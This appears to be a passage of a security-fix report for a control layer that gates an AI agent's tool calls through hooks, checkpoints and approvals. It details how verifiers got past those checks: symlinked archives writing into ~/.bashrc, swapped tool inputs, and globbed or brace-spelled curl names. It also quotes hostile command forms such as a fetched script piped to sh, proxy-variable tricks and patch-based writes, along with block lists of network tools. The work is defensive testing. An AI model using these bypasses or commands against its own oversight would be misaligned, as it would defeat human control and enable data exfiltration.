absolute `checkpoint_dir` through a linked parent, an unchanged input, a
control-only call with no record).

#### 10. The checkpoint archive followed a repository-shipped link (medium); siblings: the checkpoint directory, the archive directory, the snapshot store

The tracker opened its state file and lock with `O_NOFOLLOW` and did not load
a state file git tracks, but appended pruned checkpoints with
`open(checkpoint_dir/archive/pruned_checkpoints.jsonl, "a")` after
`archive.mkdir()`. git stores links, so a clone could ship the archive file
as one: the 102nd checkpoint (each a call that needs no checkpoint and no
approval: `git stash create`, a bound `checkpoint` tool) appended a JSON line,
with the `reason` and `scope` a bound tool's caller writes, wherever it led
(the verifier's probe: `~/.bashrc`, and a `$(...)` in the reason ran when the
shell started). Siblings the verifier found: a link at `.checkpoints/archive`
made the tracker create the archive in another directory, and one at
`.checkpoints` itself put the state file, its lock and the archive there
(`O_NOFOLLOW` guards only the last component; `mkstemp` and `os.replace` ran
in the linked directory). Sibling found here: `FileSnapshotStore(".",
".snapshots")`, which the SDK guide names, resolved `store_dir` through a
link and created `objects/` and `manifests/` there, and `chmod`ed the target
to 0700.

- Fix: `grounded_agency/utils/layer_dir.py` (`open_layer_dir`, `LayerDir`,
  `LinkedPathError`): a directory of the layer's records is opened without
  following a link at it, nor, for a relative path, at any directory on the
  way to it from the current one (the directories above an absolute path are
  the host's); every file operation then stays in that directory through its
  descriptor (`dir_fd`: open with `O_NOFOLLOW`, `mkdir`, the temporary file,
  `os.replace`, `unlink`), with an `lstat` check per name where the platform
  has no `dir_fd`.
- Tracker: the state file, its lock, its temporary file and the archive are
  opened through it; the archive only as a regular file (`fstat`, opened
  `O_NONBLOCK` so a FIFO is not waited on), created mode 0600, and an
  archive git tracks is neither read nor appended to (`_tracked_by_git`, as
  for the state file). With a link, the tracker writes nothing and keeps its
  records in memory; a prune that cannot archive is logged with the ids it
  drops, and the pruned checkpoints' content is discarded either way
  (before, it was discarded only after a successful archive write).
- Snapshot store: `_private_store` makes or checks `store_dir`, `objects/`
  and `manifests/` the same way (mode 0700 through the descriptor) and
  raises `ValueError` for a link.
- Not changed: the tracker's `marker_dir` (`.claude/checkpoint.ok`) keeps
  the plugin's convention, which reads and writes a linked `.claude` where
  it leads (round 2 #2); the tracker writes a fixed name with fixed content
  there by `os.replace`, never through a link at the file and never an
  append. The evidence, idempotency and memory stores open a path the host
  names with `O_NOFOLLOW` at the file and create no directory.
- Tests: `tests/test_shipped_record_links.py` (16): a shipped link at the
  archive file, at `.checkpoints/archive` and at `.checkpoints`, from a
  relative and an absolute `checkpoint_dir` (nothing written or read through
  it, the prune logged, the tracker still authorises its calls); a tracked
  archive neither read nor written; the adapter end to end (102 calls of a
  bound checkpoint tool through the hooks `wrap_options` installs, the
  verifier's reproduction); the snapshot store with a linked `store_dir`,
  `objects/` or `manifests/` (`ValueError`, nothing made there, no mode
  change); controls (an ordinary archive, written 0600 and read back; an
  absolute path through a linked parent; an ordinary store).

#### 11. A boundary in any session cleared the per-call state of other sessions' calls in flight (medium)

`end_of_turn` (the Stop or UserPromptSubmit of any session the adapter
serves) cleared `_call_dirs` and `_asked_at` for every call. The permission
callback then classified a waiting call in the host process's directory and
counted `approval.expires` from its own start: a `git log -p` in a partial
clone (gated as `mutate` and `send` in its own directory) was `observe` and
allowed with no approval, on a checkpoint the boundary had ended; a decision
40 s after a PT30S ask was allowed. The window is from A's PreToolUse hook
to the start of the callback (the verifier's correction: a boundary while the
host's prompt is open was already refused).

- Fix: one record per call, `_HookCheck` (the digest of the input the hook
  checked, the call's `cwd`, the time of its ask), kept by the PreToolUse
  hook for every call it passes or asks about (a wrapper around the checks,
  so every such return keeps one) in `_hook_checks`, until the call reports
  back (PostToolUse, PostToolUseFailure drop it first thing) or the callback
  refuses it. No boundary clears it: it records what was checked and
  authorises nothing (the boundary still clears `_allowed`, `_asked_calls`
  and `_outcome_recorded`). The table is bounded (`_HOOK_CHECK_LIMIT`, 4096,
  oldest first: a call the host refused by its own rules leaves one).
- The callback refuses with R407 a call it has no record of (§5.18.8: it
  cannot tell what was checked), a control-only call excepted; a call
  without a `tool_use_id` that needs a checkpoint keeps its earlier
  diagnostic (F501 when no checkpoint is valid, else R407).
- Tests: `TestABoundaryKeepsWhatTheHookChecked` in
  `tests/test_permission_callback_record.py` (the partial clone with the host
  process elsewhere and session B's Stop or UserPromptSubmit in between:
  refused as `mutate`, nothing fetched; with a host that approves, F501; the
  PT30S expiry with the callback starting at 25 s and the answer at 40 s:
  F502), and `TestACallTheHookHasNoRecordOf` (R407; a control-only call still
  runs; the record goes when the call reports back or is refused; the
  oldest goes past the limit, and its call is then R407).

#### 12. The permission callback did not check input other than the one the hook checked (medium)

`decide_permission` classified the callback's input, but ran the secret,
destination and prerequisite checks only when the host's allow carried an
`updated_input` that differed from it. Claude Code gives every PreToolUse
hook the model's input and then runs the call with another hook's
`updatedInput` in its place (read from the bundled CLI by the verifier), so
the callback was asked about input B while the hook had checked A: a send to
a destination the policy refuses and persist data holding an AWS key were
allowed, with or without a host callback.

- Fix: with #11's record, an input whose digest differs from the one the
  hook checked (or with no record, in non-strict mode) is changed arguments
  (§5.18.7), `_changed_input_refusal`: the secret and destination checks of
  §5.18.10 (F504), the prerequisites and a checkpoint the call does not hold
  (F501, F503, V102; logged with `strict_mode=False`), and F502 for a call
  that requires approval (the decision asked for was on other arguments).
  The host's own `updated_input` is checked as before.
- Not covered, named in the statement's host gaps and SECURITY.md §5.5: a
  call the hook passed that Claude Code's own rules allow without the
  callback (`allowed_tools`, an allow rule, `bypassPermissions`) runs with
  another hook's `updatedInput`, which the layer sees only at PostToolUse; a
  host that adds such a hook keeps the tools it rewrites out of those rules.
  For the plugin the same rewrite comes from a hook in the settings, whose
  commands already run unchecked (round 2 #6, #9).
- Tests: `TestAnInputTheHookDidNotCheck` (the verifier's cases: a refused
  destination and a key in `TaskCreate` data, F504 with and without a host
  callback; an allowed destination with other arguments, F502; `ls` checked
  and `rm -rf x` asked about, F501; the same input, allowed and granted).

#### 13. Re-wrapping options kept the first wrap's safety hook (medium); siblings: the permission mode, a prompt tool removed

`wrap_options` kept the existing hooks when they held this adapter's safety
hook, which was built with the first wrap's `prompt_tool` and
`options_mode`. Wrapped, then given a `permission_prompt_tool_name` (and
`can_use_tool=None`, which the SDK requires) and wrapped again, the options
had no callback and the old hook asked about a Write and held its
checkpoint: allowed by the prompt tool after another session's boundary, it
ran on the ended checkpoint with no F501 (round 1 #20's R407 no longer
applied), and `approval.expires` was not refused (F502). Siblings: a
`permission_mode` set between the wraps was not read (the hook answered
`ask` in `bypassPermissions` for an input without a mode), and a prompt tool
removed between the wraps kept refusing Writes with R407.

- Fix: on a re-wrap, `_replace_safety_hook` puts a safety hook built for the
  options now wrapped where the first one was, keeping any other function an
  entry held beside it; the other hooks are kept as before (one safety hook,
  so the rate limit is charged once).
- Tests: four in `TestWrapOptionsApproval` (`tests/test_tool_call_approval.py`):
  re-wrapped with a prompt tool, a Write is R407 holding nothing and an
  `approval.expires` binding F502, with one safety hook; re-wrapped in
  `bypassPermissions`, F502; re-wrapped without the prompt tool, the Write is
  asked about and allowed; a host function sharing the safety hook's entry
  is kept.

#### Tests changed to the new behaviour

31 tests called the permission callback without the PreToolUse hook that
Claude Code always runs first, so they met #11's R407. One,
`test_context_without_tool_use_id_still_needs_a_checkpoint`, passes
unchanged once a call without a `tool_use_id` keeps its F501 diagnostic.
The other 30 now run the hook on the call first
(`tests/conftest.py::pre_tool_use`, or the wrapped options' hook), keeping
what they test: `test_permission_callback.py` (4),
`test_tool_call_approval.py` (13), `test_sdk_e2e.py` (4),
`test_sdk_integration.py` (4), `test_checkpoint_holds.py` (3, through a
local `_decide` that refuses where the hook refuses),
`test_mcp_integration.py` (1), `test_adapter_effects.py` (1). One more
stated #13's old behaviour: `test_wrapping_twice_charges_the_rate_limit_once`
(`test_sdk_e2e.py`) asserted that the re-wrapped hooks equal the first
wrap's; it now asserts that the other hooks are equal and that PreToolUse
holds one entry with one safety hook, and still charges the rate limit
once. Where the old
test asserted the callback's F501 for a call the hook itself refuses, it now
asserts the hook's F501 (the callback is never asked about such a call);
`test_host_is_not_asked_about_a_call_without_a_checkpoint` now ends the held
checkpoint's validity between the hook and the callback, the path on which
the callback meets it; `test_the_request_is_the_layers_ask` asks the second
call through the hook and adds a third, never asked about, which is R407.
The four SDK demos (`examples/grounded_agent_demo.py`,
`checkpoint_enforcement_demo.py`, `mcp_tools_demo.py`,
`capability_skills_demo.py`) run the hook before the callback the same way,
and `tests/test_examples_demos.py` passes unchanged.

#### Siblings checked

- The TypeScript package and the Standard Agents binding check a call in
  the tool's own handler, with the arguments it runs with, and bind a
  decision to their digest: there is no hook and callback pair, no
  per-call state a boundary clears, no wrapping of options, and no file the
  binding writes (no archive, no state file). No call fixture changes.
- The plugin's hooks: Claude Code's own prompt decides, with no callback of
  the layer's; another hook's `updatedInput` is the host gap above. The
  plugin's take hook already refuses a linked records or commits directory.
- The other adapter tables a boundary clears (`_allowed`, `_asked_calls`,
  `_outcome_recorded`) are authorisations, which a boundary must withdraw.

#### Documentation

SECURITY.md §5.5 (the tracker's and the store's link rule; what the callback
decides on, the R407 and changed-input rules and the `updatedInput` host gap;
re-wrapping), the adapter's statement (`host_gaps`, the `updatedInput` gap),
`docs/integrations/claude_agent_sdk.md` (the checkpoint section, the approval
list, checkpoint content), the docstrings of `wrap_options`, the permission
callback and `CheckpointTracker`, and CHANGELOG [Unreleased] Upgrading (the
tracker and the snapshot store; re-wrapping; the callback). The Standard's
text was not changed: §5.18.7's changed-arguments rule already covers
arguments other than those the call was checked with, and §5.18.8 the R407.
No version changes.

#### Checks after batch 3

- Python: `pytest tests/` (5668 passed, 18 skipped); ruff check and format
  with CI's lists; mypy; every `tools/validate_*.py` of CLAUDE.md,
  `validate_workflows.py --strict` and every domain catalog and example
  `--strict`; `sync_skill_schemas.py --check` and the generators' `--check`;
  `scripts/run_conformance.py`; the four SDK demos (no R407 in their output).
- Rust: no Rust source changed, so `cargo test` was not rerun.
- TypeScript: `packages/acs-core` build, check and test (2002; the
  WebAssembly build reused); the binding's check and test (217, 2 skipped).
  No TypeScript source changed.
- Site: `npm run check`, `npm test` (1173).
- Probes, each under `timeout 120` and a 4 GB address-space limit, inputs at
  most 1 MB, in a scratch copy of the reporters' probes pointed at this
  worktree: the archive link (101 checkpoints, nothing written to the
  linked `~/.bashrc`, nothing run); the boundary between hook and callback
  in a partial clone (F502 without the boundary, F501 with it; never
  allowed); the PT30S expiry across a boundary (F502); the input swap (F504
  for the destination and the key, with and without a host callback); the
  re-wrap with a prompt tool (R407, no hold). Timing: the hook and the
  callback on a 1 MB Write input, 0.013 s and 0.022 s; a checkpoint that
  prunes the history, 6.4 ms (two git calls), against 1.2 ms without. No
  CLI or nested agent was started; nothing was left running; the scratch
  repositories were removed.

### Batch 4: four reported defects

Four defects, each reproduced by an independent verifier on bfb18b1, all in
the command hooks three skills declare in their frontmatter (send, audit,
rollback). None was fixed by an earlier batch (git log, round 1 and batches
1 to 3 checked: round 1 #23 to #25 built the shared word reader these
hooks use, and their tests pass unchanged). Skill hooks stay registered for
the rest of the session once the skill ran, so each fix keeps reading only
what may concern the hook, and widens that to what the reports showed it
missed. Each fix has tests that fail on the code before it: the 301 new test
cases (each command under sh and bash) were run with 5945508's three
SKILL.md files put back, and 215 failed; the 86 that passed
are the controls (ordinary commands each hook must leave alone, the recorded
restore read through quotes) and 13 sibling forms the old hooks refused by
accident (the rollback hook's raw match found `git stash apply` inside
`sh -c '...'`, `echo '...' | sh`, `awk`, a here-string, a here-document and
`xargs`, and failed `$(cat id.txt)` and an unclosed quote as no full id; the
send hook refused `env -S`, `find -exec sh -c` and `git rebase -x` as a
request inside a word or a `-x` cluster, `$"curl"` for its `$`, and `declare
-n r=http_proxy; r=...` for its assignment). Two cases moved: `curl
https://example.com/install.sh | sh` was in `test_leaves_other_commands_alone`
and is now refused (code piped to a shell), in
`test_blocks_code_a_program_runs`.

The plugin's pre-tool-use hook and the SDK mapper already gate every
reported command as `mutate` (or `execute` and `send`): checked again for
the 15 reported forms with the mapper (`mutate`/`execute`, checkpoint and
approval each), and by the verifiers with the hook (F501 without a marker).
So no gated call ran without a checkpoint and approval; each defect is a
skill's narrowing that did less than SECURITY.md said. Neither the
TypeScript package nor the binding has a Bash tool or these skills, and no
call fixture changes.

#### 14. The send skill's hook: names the shell builds, piped code, code strings, copies and xargs (medium)

The hook read a command only when its raw text, quotes removed, named curl,
wget or http; found the request program only where a word's name was
literally one of those; read code in a word only for programs on its
`shells` list; and never read a URL that reaches curl on stdin. Fourteen
probes reached a 127.0.0.1 listener with exit 0.

- Fix, in every command (`skills/send/SKILL.md`): each run of the text
  (split at blanks and operators, quotes and backslashes removed) that holds
  a glob character or a brace is expanded as bash expands braces (the
  innermost group first, `{a..z}` and `{1..9}` sequences, at most 256 words
  from 32 groups, else refused) and its last component matched as a glob
  against `curl`, `wget`, `http` and `https`; one that may name a tool is
  refused (`/usr/bin/c?rl`, `c[u]rl`, `cu{r,r}l`, `wg?t`, `cp
  /usr/bin/c?rl fetch`). A pattern with no letter or digit of its own (`*`)
  names none, and one of more than 5 characters a match must take (a class
  one, a `*` none) names none, so `ls *.py`, `rm -rf build/*`, `mkdir -p
  src/{a,b}` and a here-document's `* item` lines are left alone. The name
  gate also opens for `$'...'` and `$"..."` (`$'\x63url'`) and for a `/dev/`
  path the shell expands (`/dev/${t}cp`, `$D/tcp/`), which the `$` refusal
  then blocks. A command over 16384 bytes that names a tool or holds a glob
  or a brace is refused (it was only one naming a tool).
- Fix, in a command that names a tool: a request inside a word where the
  command runs any program that runs one (the list now holds `trap`,
  `alias`, `awk` and its kin, `sed`, `find`, `make`, `xargs`, `parallel`,
  the wrappers, editors, database shells, ...; and git when given `-x`,
  `--exec`, `--extcmd` or `foreach`), and a `!` before the tool's name
  counts; code a shell or an interpreter reads from a pipe or a redirection
  (`... | sh`, `sh < f`, `sh <<< '...'`, `| python3`, `python3 -`,
  `/dev/stdin`; a pipe into `python3 -m json.tool` or `python3 -c '...'`
  still runs); `xargs` or `parallel` before the tool; a copier (`cp`, `ln`,
  `install`, `cat`, `dd`, `tee`, `rsync`, ...) the command runs, or runs
  after `sudo` and the like, given the tool; and a git setting outside an
  allowlist (`user.*`, `color.*`, `advice.*`, `init.defaultbranch`,
  `core.quotepath`, `i18n.*`, `column.*`, `log.*`), with `-c` or in `git
  config`, where it refused only `http.*`, `url.*`, `core.gitproxy`,
  `core.sshcommand`, `protocol.*` and `remote.*` (so `alias.*`,
  `core.pager`, `core.fsmonitor`, `credential.helper`, `diff.external` ran).
- Left as the documented limit, stated in the hook and SECURITY.md §5.4: a
  request another program makes with no tool's name in its text (a program
  named by a variable, `"$(...)"` inside quotes, a copy made in an earlier
  command under another name, a script, an interpreter's code). The
  internal-address rule is a host-specific narrowing (§5.18.10's last
  paragraph): the plugin applies no destination policy, so §4.4.2's
  "refuse what you cannot tell" binds no destination here, and the plugin's
  hook gates every such call. Refusing every command the hook cannot read
  would refuse every interpreter for the rest of the session.
- Tests (`TestSendCommandHook`): `test_blocks_code_a_program_runs`,
  `test_blocks_a_request_another_program_starts`,
  `test_blocks_a_word_the_shell_may_expand_to_a_tool`,
  `test_reads_a_name_the_shell_spells`, and new cases in
  `test_leaves_other_commands_alone` (globs and braces that name no tool, a
  here-document of bullets, data piped to `python3 -m json.tool`).

#### 15. The send skill's hook: a proxy variable set without `=` (medium)

The setting rule matched `NAME=` only, but bash sets a variable with no `=`
(`for http_proxy in`, `read`, `printf -v`, `getopts`, a nameref) and exports
it with `export NAME` or `set -a`; git reads `GIT_CONFIG_COUNT`,
`GIT_CONFIG_KEY_n` and `GIT_CONFIG_VALUE_n`, which the rule did not list.

- Fix: a word that names a sensitive variable, with or without a value, is
  refused in a command that names a tool: `CURL_HOME`, `WGETRC`, the CA
  bundles, `HOSTALIASES`, `RES_OPTIONS`, `LOCALDOMAIN`, `BASH_ENV`, any
  `*_proxy` in any case, any `GIT_*` and the loader's `LD_*`/`DYLD_*` as a
  word or a word's part (`-vhttp_proxy`, `r=http_proxy`); `HOME`, `PATH`,
  `ENV`, `IFS` and `XDG_CONFIG_HOME` as a word of their own, `NAME=...`,
  `-vNAME` or a nameref's value. A long option's value stays the request
  reader's (`wget --exe=http_proxy=...` is a redirect, as before).
- Tests: `test_blocks_a_setting_made_without_an_assignment` (the three
  reported forms; allexport, `while read`, `ALL_PROXY`, wget, `-vNAME`, a
  nameref, `getopts`, `GIT_CONFIG_*`, `GIT_CONFIG_PARAMETERS`, `export
  LD_PRELOAD=`, `export PATH=`, `read CURL_HOME`).

#### 16. The audit skill's hook: a brace-expanded path, and a program that takes the file's name from its input (medium)

The hook read a command other than the append form only when its text named
the records, it ran under `.claude`, or it held `*`, `?` or `[`; braces were
no trigger, and a program that writes the files a patch or an archive names
never names them in the command. `tee -a .cl{a,}ude/au{d,}it/rec{o,}rds.js{o,}nl`
and `git apply notes.patch` each wrote a token line into the records file.

- Fix (`skills/audit/SKILL.md`): the hook now reads every command that holds
  a brace, a glob, a redirection with `$` or a backtick, or the name of a
  program that writes the files its input names. A word with a brace is
  expanded as bash does (the send hook's expansion) and each word it gives
  is matched against the records path; a glob or a brace that may name the
  file or a directory on its way (`.claude`, `.claude/audit`: `cd
  .cl*/au*t && ... >> rec*.js*nl`, a sibling the old hook let through) and a
  redirection to a name the shell builds (`>> $A$B$C$D$E`) send the command
  to the full reading (no write but the append form, readers only,
  unquoted braces refused). In every command, a program that writes the
  files its input names is refused where a command runs it or after a
  program that runs another (`timeout 5`, `env -u x`): `patch`, `rsync`,
  `bsdtar`, `cpio`, `pax`, `ar`, `7z`, `unar`, `unrar`, `jar`, `busybox`,
  ...; `tar` but to create or list with short options; `unzip` but to list;
  git's `apply`, `am`, `update-index`, `read-tree`, `checkout-index`,
  `mktree`, `fast-import`, a git alias (`-c alias.*`, `--config-env`, `git
  config alias.*`); `find` with `-exec`, `-execdir`, `-ok`, `-okdir` or
  `-fprint*` running a program other than the readers; `xargs` running one.
  A here-document's lines are read as commands too (`sh <<'EOF'` then `git
  apply`), and one whose text a quote carries past a line's end is refused,
  since where its body ends is not read. Each check reads at most 64 words
  past the program (a longer one is refused), so the reading stays linear.
- Not taken: refusing every program but the readers in every command (the
  session's other work), and a PostToolUse scan of the records file (it
  could only report a credential already written). Left as the documented
  limit: a name built only when a command runs, code inside a word (`sh -c`,
  a command substitution inside quotes, an interpreter's code, a script),
  and a link planted under another name; the plugin's hook gates each as a
  `mutate`.
- Tests (`TestAuditCommandHook`): `test_blocks_a_name_the_shell_builds`,
  `test_blocks_a_program_that_writes_files_its_input_names`,
  `test_a_patch_that_writes_the_records_file_is_refused_before_it_runs`
  (the reported route end to end: refused, and `git apply` does write the
  token), and new cases in `test_allows_other_commands` (`mkdir -p
  src/{a,b}`, `echo {1..3}`, `cp f{,.bak}`, `jq '{a,b}'`, `find -exec grep`,
  `xargs wc -l`, `tar czf`, `unzip -l`, a JSON here-document, the commit
  message here-document with `apply` and `patch` in it).
- Timing: the hook's own long-input paths, 16384 bytes each under a 4 GB
  limit: a word per two bytes 0.58 s, brace words 0.80 s, a here-document
  of 2700 lines 1.30 s, `env` then 4000 `tar` words 0.26 s. A pattern of
  16000 braces took 11.8 s while the glob match built a regex from it; a
  pattern with more characters than the name it is compared with now builds
  none (0.23 s), which also bounds the glob path the hook had before.

#### 17. The rollback skill's hook: other spellings of `git stash apply|pop` (low)

The hook found restores with a regex on the raw text, so `git -C . stash
apply`, `git "stash" apply`, `git stash app''ly` and `git -c x.y=z stash
pop` named no restore and exited 0 for an unrecorded commit.

- Fix (`skills/rollback/SKILL.md`): the hook copies the shared word reader
  (`hooks/shell_words.jq`, kept equal by `test_shell_words_copies_are_equal`,
  which now lists rollback) and reads a command that names `stash` (quotes,
  backslashes and `$` removed) or holds `$'...'` or `$"..."`. A simple
  command with a word that names git (or splits into words, or is the
  program and expands), a `stash` word and a `pop`, `apply` or `branch` word
  (or words the shell expands) is a restore, allowed only as `git stash
  apply|pop <id>`, those four words alone with none expanded, and only for a
  recorded commit, as before; a word holding a command line with `stash` and
  a restore (`sh -c '...'`, `echo '...' | sh`, `awk`'s `system`) and a
  command the reader cannot read are refused with F503 as well. The quoted
  form of a recorded restore (`git "stash" apply <id>`) still restores, as
  the plugin's hook counts it a rollback.
- Tests (`TestRollbackCommandHook`): `test_blocks_another_spelling_of_a_restore`
  (the four reported forms and 19 siblings, recorded commit or not),
  `test_a_long_command_naming_stash_is_refused_in_bounded_time`,
  `test_reads_the_recorded_restore_as_the_shell_passes_it`, and new cases in
  `test_allows_commands_that_restore_nothing`.

#### Siblings checked

- The plugin's pre-tool-use hook and the SDK mapper: each reported form is
  gated (above); the mapper's interpreter and network rules already take
  `send` with the worst case, so a destination policy refuses them in the
  SDK (§4.4.2).
- The persist skill's hook reads file tools' paths and content, not Bash
  commands, so none of these forms reaches it.
- Round 1's send and audit fixes (#23 to #25) hold: their tests pass
  unchanged, with the reader's refusal of an unquoted brace, a here-document
  and an unclosed quote in a command that names a tool or the records.

#### Documentation

SECURITY.md §5.4 (the send, audit and rollback rows: what each hook reads,
refuses and leaves to the plugin's hook; the shared reader's 16384-byte
bound now names the rollback hook), the three hooks' header comments,
`hooks/README.md` (the rollback hook's spellings; the shared reader's three
users and what makes each read a command), and CHANGELOG [Unreleased]
Upgrading (the plugin's skill hooks, with the commands each now refuses for
the rest of a session). The Standard's text was not changed: §5.18.10's last
paragraph already makes a skill hook's extra condition a MAY, and §4.4.2
binds a destination only under a policy. No version changes.

#### Checks after batch 4

- Python: `pytest tests/` (5967 passed, 18 skipped), and again the files
  that read the skills and the docs after the last comment edits (1510
  passed; `tests/test_skill_hooks.py` 1098); ruff check and format with
  CI's lists; every `tools/validate_*.py` of CLAUDE.md,
  `validate_workflows.py --strict` and every domain catalog and example
  `--strict`; `sync_skill_schemas.py --check` and the generators' `--check`;
  `scripts/run_conformance.py`.
- Rust: no Rust source changed, so `cargo test` was not rerun.
- TypeScript: `packages/acs-core` build, check and test (2002; the
  WebAssembly build reused); the binding's check and test (217, 2 skipped).
  No TypeScript source changed: neither has a Bash tool or these skills.
- Site: `npm run check`, `npm test` (1173).
- Old code: the 301 new cases run against 5945508's three SKILL.md files in
  a scratch tree of the test file, its fixtures, the hooks and the skills
  (500 KB, removed): 215 failed, 86 passed (above).
- Probes, each under `timeout 120` and a 4 GB address-space limit, commands
  of at most 1 MB: every reported form of the four defects against the new
  hooks (each refused: F504, or F503 for the rollback hook) and against the
  old ones (each exit 0); the patch route end to end (`git apply` writes the
  token; the hook refuses the call first); the SDK mapper on the 15
  reported forms (each gated). Timing at the 16384-byte bound: the send
  hook 0.04 to 1.16 s (a word per two bytes when it names curl, 1.16 s; a
  glob word per three bytes, 0.41 s; 16000 brackets, 0.04 s); the audit
  hook 0.02 to 1.30 s (above); the rollback hook refuses a 1 MB command
  that names `git stash` at once. No listener was needed (each form is
  refused before it runs); no CLI or nested agent was started; nothing was
  left running; the scratch repositories and trees were removed.

### Batch 5: four reported defects

Four defects, each reproduced by an independent verifier on bfb18b1, all in
the Standard Agents binding's nested calls of tools defined with plain
`defineTool` (`examples/standard_agents/src/acs/grounded.ts`,
`nestingState`). None was fixed by an earlier batch: git log, round 1 (#27
built the plain-tool path, #31 the "what the composite held" rule for
grounded tools, #33 the late-invocation refusal) and round 2 batches 1 to 4
checked, and each reported probe reproduced on fb50354 before the fix. The
root they share: round 1 #27 had the composite's nesting state check a
plain tool's nested call, which runs without the wrapper, by the binding
listed, and it made only three of the checks a call of its own gets, for
only one of the two routes the state offers, against a binding it could not
tell was the one that runs. Each fix has tests that fail on the code before
it: `test/nesting.test.ts`, `test/layer.test.ts` and `test/calls.test.ts`
were run with fb50354's `grounded.ts` put back (the new `layer.ts` kept,
which the old code ignores): of the 16 new tests and the one whose
expectation changed (`uses`), 14 failed; the 3 that passed are controls (a
listed grounded tool is queued, then checked as a call of its own; a plain
tool registered as the one listed runs) and `registerTools`' own
validation. The tests whose setup changed (below) pass on both.

The Python adapter never sees a nested call (its statement's
`does_not_cover`: "a tool's own nested calls") and refuses a composite that
reaches a send under a policy (round 1 batch 3), so none of the four has a
Python sibling; no call fixture changed, and both layers still agree on
every fixture.

#### 18. A nested plain persist or audit call stored a secret (medium)

`invokePlain` checked a send's destination, the composite's decisions and
the prerequisites, then ran the tool: no secret check, although §5.18.10's
persist and audit rows require F504 and §5.18.4 says every other check
still applies. A grounded `persist` tool refused the data; a composite
invoking a plain one stored it, and the trace recorded an executed persist.

- Fix: `invokePlain` refuses (F504, recorded `refused` with `covered_by`)
  a nested call whose binding's capabilities include `persist` or `audit`
  when `holdsCredential(args, composite.secrets)` (the composite's own
  secrets and the layer's), first, as `check` does for a grounded tool.
- Tests: `refuses a nested persist|audit call of a plain tool whose data
  holds a secret, as a grounded one is` (a layer secret, and the default
  patterns' password and AWS key; data without one is stored and recorded
  executed).
- Call fixture: none. The fixture schema states binding records, and each
  runner builds every binding as its own tool (the binding's as grounded
  tools, which already refused), so a fixture cannot say "a tool the layer
  did not define"; the nesting tests pin the plain path instead.

#### 19. queueTool through a composite's state bypassed the invokes list and every check (medium; sibling of round 1 #33)

The nesting state replaced `invokeTool` only; `queueTool` was the runtime's
own, bound to the raw state. A composite queued a listed plain `send` to an
attacker host under a destination policy (and a grounded tool with no
`invokes`, which declared no `uses`, queued any tool); the queued call ran
after the composite with nothing to check it, and the trace held no entry.

- Fix: the nesting state's `queueTool` refuses (throws the F504 refusal,
  and records it) a tool the composite does not list, any tool once its call
  has ended (no `covered_by`), a name the layer cannot tell the runtime runs
  as the listed tool (#21), and a listed plain tool: a queued call runs
  after the composite's call has ended, which §5.18.4 makes a call of its
  own, and a plain tool has no wrapper to check it then. A listed grounded
  or control tool is queued as before: it checks itself when it runs.
  `groundedTool` now declares `uses: invokeNames` always, so a tool with no
  `invokes` declares `uses: []` and a runtime that enforces `uses` refuses
  both routes.
- Tests: `refuses to queue a listed plain tool, whose queued call nothing
  would check` (the reported route: nothing queued, nothing sent, refused
  with `covered_by`), `refuses to queue a tool the composite does not list,
  and declares an empty uses for a tool with no invokes`, `refuses to queue
  through the state once the composite has returned`, and the control
  `queues a listed grounded tool, whose queued call is checked as a call of
  its own` (it asks for its own approval, F502).
- Test changed to the new behaviour: `declares uses only for a tool with
  invokes` became `declares its invokes as uses, and none for a tool with
  no invokes` (`[]` where it was `undefined`).
- Siblings checked: the state's other members run no tool of this thread.
  `getChildThread`/`getParentThread` return another thread's state, a scope
  of its own where a grounded tool checks itself and a plain tool's call is
  not covered (the statement's `does_not_cover`); `runAgent` starts an
  agent's execution, whose tools check themselves; `scheduleEffect` runs an
  effect, whose writes the statement does not cover; `runCode` and the
  network are the composite's own code, which §5.18.4 says `invokes` does
  not bound.

#### 20. A nested plain call's output was never checked (medium)

`invokePlain` completed the entry `executed` whenever the result was not an
error: no output contract (R402), no grounding policy (F505), no minimum
confidence (F504), although SECURITY.md said the binding checks "the output
contract [of] each result [it receives] as a capability output". So a plain
`checkpoint` that returned "snapshot service unavailable, skipped" counted
in `acs:executed`, and a later rollback passed its F503 check; a nested
classify at confidence 0.12 passed a profile's 0.9 minimum.

- Fix: on a success result of a binding that is not control-only,
  `invokePlain` decodes `result.result` as the capability's output
  (`decodeCapabilityOutput`, §5.18.9's consumer checks), then applies the
  composite's grounding policies that require the capability (its own
  `grounding` and its applied profiles', unfiltered by the composite's own
  capability; `seen` is null, as a plain tool attests nothing) and the
  composite's applied profiles' minimum confidence, in the order `execute`
  applies them to a grounded tool. A refused output completes the entry
  `failed` with R402, F505 or F504 (and `reason_code`), so the capability is
  not counted as executed, and the refusal is what the composite's code
  receives. An output that passes is recorded with its evidence anchors
  and notified (§6.6), as a grounded tool's is. A plain tool has no options
  of its own, so the composite's govern its nested calls; a nested grounded
  call keeps its own.
- Tests: `refuses a plain checkpoint whose output is not one (R402): it
  takes none, so a rollback stays F503` (the reported route),
  `checks the contract of each capability` (classify without `labels`,
  retrieve that is not JSON, a send with no result), `applies the
  composite's grounding policies (F505) and its profiles' minimum
  confidence (F504)` (0.12 below 0.9, an out-of-range confidence the
  contract refuses first, no anchors under a `kinds: [file]` policy, and an
  output that passes, recorded with its anchors).
- Tests changed to the new behaviour: round 1 #27's relay tests return a
  send's output (`{"sent": true, "evidence_anchors": []}`) where they
  returned `ok`, which is now R402.
- Timing: a nested plain persist and retrieve with 1 MB of data and output
  each run in 63 ms (64 KB 19 ms, 256 KB 23 ms): the secret scan and the
  decoder are linear.

#### 21. A nested plain call was checked against the record listed, not the tool the runtime runs (medium; plain-tool sibling of round 1 #31)

The nesting state checked a plain tool's nested call by the annotation of
the object in `invokes`, then called `state.invokeTool(name)`, which runs
whatever tool the runtime registers under the name. A composite listing a
plain `retrieve` as `lookup` ran a registered plain `send` to an attacker
host under a policy, recorded as a covered retrieve; a registered send
whose `destination` pointer differed sent where the listed pointer did not
look. The verifier's sibling: a name listed for a grounded tool, under
which the runtime runs a plain send, ran with no entry at all. #31's note
("Plain tools listed in invokes need no change: their binding is the listed
object's") assumed the runtime runs the listed object.

- Fix: the layer cannot read the runtime's registry (`ThreadState` has
  none, and names resolve in the runtime's namespace), so the deployment
  states it: `registerTools({ name: tool })` (new, `src/acs/layer.ts`),
  called with the agent's tools once they are defined; calls add up, a name
  registered with two different tools is one the layer cannot tell, and
  `resetLayer` clears it. A nested invocation (`invokeTool` or `queueTool`)
  is refused with F504 before anything runs, recorded with `covered_by`,
  when: the name is registered as another tool than the one listed, or as
  two; the listed tool is plain and the name is not registered (its checks
  are its listed binding's); or a destination policy is in force (the
  layer's, or the composite's and enclosing composites' profiles') and the
